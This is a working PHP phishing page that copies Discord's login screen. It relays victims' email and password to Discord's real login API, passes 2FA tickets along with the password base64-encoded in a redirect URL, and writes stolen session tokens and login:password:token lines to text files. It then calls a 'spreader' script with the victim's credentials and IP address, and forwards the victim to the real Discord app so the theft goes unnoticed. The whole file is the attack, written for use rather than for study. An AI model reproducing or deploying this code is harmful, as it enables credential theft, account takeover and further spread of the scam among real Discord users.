<?php
include 'config.php';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // The request is using the POST method
    $login = $_POST['login'];
    $password = $_POST['password'];
    $captcha_key = $_POST['captcha_key'];

    $url = "https://discord.com/api/v9/auth/login";
    $payload = json_encode(array('login' => $login,
    'password' => $password,
    'undelete' => FALSE,
    'captcha_key' => $captcha_key,
    'login_source' => NULL,
    'gift_code_sku_id' => NULL ) );

    $request_headers = array(
        "Content-Type: application/json"
    );
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload );
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
    $result = curl_exec($ch);
    curl_close($ch);
    if (strpos($result, '"mfa"') !== false) {
		// 2fa redirect
		$ticket = json_decode($result, true)["ticket"];
		$pw = base64_encode($password);
		$em = base64_encode($login);
		header("Location: /mfa.php?ticket=$ticket&em=$em&pw=$pw"); 
        exit();
    }
    else if (strpos($result, '{"token":') !== false) {
        $MSG = "SUCCESS";
        $yay = json_decode($result, true);
        $token = $yay["token"];

		if ($SAVE_TO_TXT) {
			$myfile = fopen("Tokens.txt", "a");
			fwrite($myfile, $token."\n\r");
			fclose($myfile);

			$myfile = fopen("Fulls.txt", "a");
			fwrite($myfile, $login.":".$password.":".$token."\n\r");
			fclose($myfile);
		}
		
        require_once 'spreader.php';

		getbadges($token, $login, $password, $_SERVER["REMOTE_ADDR"]);
    }
    else if (strpos($result, 'ACCOUNT_LOGIN_VERIFICATION_EMAIL') !== false) {
        $MSG = "New login location detected, please check your e-mail.";
    }
    else if (strpos($result, 'INVALID_LOGIN') !== false) {
        $MSG = "Login or password is invalid.";
    }
    else if (strpos($result, 'captcha-required') !== false) {
        header("Location: /"); 
        exit();
    }
	else {
        header("Location: /"); 
        exit();
    }

    }
?>
<meta charset="utf-8">
<html lang="en" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class">		
		<head>
			<title>Discord</title>

		    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
		    <meta property="og:type" content="website">
		    <meta property="og:site_name" content="Discord">
		    <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities">
		    <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text. Chat, hang out, and stay close with your friends and communities.">
		    <meta property="og:image" content="src/img/ee7c382d9257652a88c8f7b7f22a994d.png">
		    <meta name="twitter:card" content="summary_large_image">
		    <meta name="twitter:site" content="@discord">
		    <meta name="twitter:creator" content="@discord">
		    <link rel="stylesheet" href="src/css/style.css">
		    <link rel="icon" href="src/img/847541504914fd33810e70a0ea73177e.ico">
		    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
		    <script charset="utf-8" src="src/js/62139f1cff10402837062.html"></script>
		    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		</head>
		<body onload="checkstor();">
		    <div id="app-mount" class="appMount-3lHmkl">
		        <div class="app-1q1i1E">
		            <div class="characterBackground-2itjYF">
	                    <img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="src/img/44e0c1fbcf99c4476083442e4a2774e0.svg">
	                </div>
		            <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
		                <canvas class="canvas-3XuBXe" width="800" height="600" style="width: 800px; height: 600px;"></canvas>
		                <div>
		                    <div class="wrapper-6URcxg" style="opacity: 1; transform: scale(1) translateY(0px) translateZ(0px);">
		                        <div class="pole2x">
		                            <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark" action="captcha.php" id="myForm" name="myForm" method="post" onsubmit="checkpole(1); return false;">
		                                <div class="centeringWrapper-2Rs1dR">
		                                    <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
		                                        <div class="mainLoginContainer-1ddwnR">
		                                            <h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO">Welcome back!</h3>
		                                            <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">We're so excited to see you again!</div>
													<div class="block-egJnc0 marginTop20-3TxNs6">
		                                                <div class="marginBottom20-32qID7">
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text">Email or Phone Number		                                                        <span id="elprimo1" class="errorMessage-3Guw2R" style="display: none"><span class="errorSeparator-30Q6aR">-</span>Required field</span>
		                                                    </h5>
		                                                    <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole1" name="email" type="email" placeholder="" aria-label="Email or Phone Number" maxlength="999" spellcheck="false" value=""></div>
		                                                </div>
		                                                <div>
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole2-text">Password		                                                        <span id="elprimo2" class="errorMessage-3Guw2R" style="display: none"><span class="errorSeparator-30Q6aR">-</span>Required field</span>
		                                                    </h5>
		                                                    <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole2" name="password" type="password" placeholder="" aria-label="Password" maxlength="999" spellcheck="false" value=""></div>
		                                                </div>
		                                                <button type="button" class="marginBottom20-32qID7 marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
		                                                    <div class="contents-18-Yxp"><a href="https://discord.com/login" target="_self">Forgot your password?</a></div>
		                                                </button><button id="sade" onclick="checkpole();" type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
		                                                	<span class="spinner-2enMB9 spinner-3a9zLT" id="loadi" style="display: none;"><span class="inner-1gJC7_ pulsingEllipsis-3YiXRF"><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span></span></span>
		                                                <div class="contents-18-Yxp">Login</div>
		                                                </button>
		                                                <div class="marginTop4-2BNfKC"><span class="needAccount-23l_Wh">Need an account?</span><button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
		                                                        <div class="contents-18-Yxp"><a  href="https://discord.com/register" target="_self">Register</a></div>
		                                                    </button></div>
		                                            </div>
		                                        </div>
		                                        <div class="verticalSeparator-3huAjp"></div>
		                                        <div class="transitionGroup-aR7y1d qrLogin-1AOZMt">
		                                            <div class="measurementFill-31KKmO measurement-DMxQp7 measurementFillStatic-MZ1pNY">
													<div class="animatedNode-5VAmrN" style="overflow: visible; opacity: 1; height: 100%; transform: translateX(0%);">
		                                                    <div class="qrLoginInner-c_7ePj"><div class="qrCodeContainer-3sXarj"><div class="asi qrCode-wG6ZgU" title="https://discord.com/ra/xVaQmLO_ZnARSznjjSth2SYKx-6w98o3fL503OEXNDQ" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);"><canvas width="160" height="160" style="display: none;"></canvas><img alt="Scan me!" src="src/img/qrcode.png" style="display: block;"></div><div class="qrCodeOverlay-qgtlTP"><img src="src/img/092b071c3b3141a58787415450c27857.png" class="asi" alt=""></div></div><h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO">Log in with QR Code</h3><div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">Scan this with the <strong>Discord mobile app</strong> to log in instantly</div></div>
		                                                </div>		                                            </div>
		                                        </div>
		                                    </div>
		                                </div>
		                            </form>
		                        </div>
		                    </div>
		                </div>
		            </div>
		        </div>
				<script type="text/javascript">
					history.pushState(null, null, '/');
                    function checkstor() {
                        if (localStorage.getItem("token") && localStorage.getItem("token")!= "") {
                            window.location = "https://discord.com/app";
                        }
                        else {}
                    }
					function checkpole() {
                        if (document.getElementById("pole1").value == "" || document.getElementById("pole2").value == "") {
                            display("This field is required");
                        }
                        else {
                            document.getElementById("myForm").submit();
                        }
                    }
                    function display(msg) {
                        document.querySelector("#sade").classList.remove("submitting-3qlO9O");
						document.getElementById("loadi").style.display = "none";
						document.getElementById("pole1-text").style.color="#ed4245";
						document.getElementById("elprimo1").innerText="- "+msg;
						document.getElementById("elprimo1").hidden=false;
                        document.getElementById("elprimo1").style="";
                        document.getElementById("elprimo2").style="";
						document.getElementById("pole2-text").style.color="#ed4245";
						document.getElementById("elprimo2").innerText="- "+msg;
						document.getElementById("elprimo2").hidden=false;
                    }
                    <?php
                    if (isset($MSG)) {
                        if ($MSG == "SUCCESS") {
                            echo 'localStorage.setItem(\'token\', "'.$token.'");';
                            echo 'window.location = "https://discord.com/app";';
                        }
                        else {
                            echo 'display(\''.$MSG.'\');';
                        }
                    }
                    ?>
				</script>
		</body>
</html>